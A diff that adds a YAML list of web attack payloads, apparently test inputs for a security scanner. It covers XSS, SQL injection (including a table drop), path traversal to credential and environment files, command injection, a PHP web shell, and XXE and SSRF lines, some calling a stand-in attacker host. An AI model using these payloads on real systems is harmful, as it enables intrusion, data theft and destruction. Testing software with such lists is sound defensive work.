@@ -1,0 +1,28 @@
+xss_basic: '<script>alert("XSS")</script>'
+xss_img: '<img src=x onerror=alert("XSS")>'
+xss_body: '<body onload=alert("XSS")>'
+xss_svg: '<svg/onload=alert("XSS")>'
+xss_input: '<input onfocus=alert("XSS") autofocus>'
+
+sqli_union: "UNION SELECT username, password FROM users--"
+sqli_error: "' OR '1'='1"
+sqli_blind: "' OR SLEEP(5)--"
+sqli_time: "'; WAITFOR DELAY '0:0:5'--"
+sqli_stacked: "'; DROP TABLE users--"
+
+lfi_etc_passwd: '../../../../etc/passwd'
+lfi_win_boot_ini: '../../../../boot.ini'
+lfi_proc_self_environ: '../../../../proc/self/environ'
+lfi_var_log_apache: '../../../../var/log/apache/access.log'
+
+rce_php: '<?php system($_GET["cmd"]); ?>'
+rce_bash: ';/bin/bash -c "echo vulnerable"'
+rce_python: ';python -c "import os; os.system(''id'')"'
+rce_perl: ';perl -e "print `id`"'
+
+xxe_basic: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>'
+xxe_blind: '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/collect.php">]><foo>&xxe;</foo>'
+
+ssrf_basic: 'http://127.0.0.1/'
+ssrf_file: 'file:///etc/passwd'
+ssrf_dict: 'dict://attacker.com:1337/'
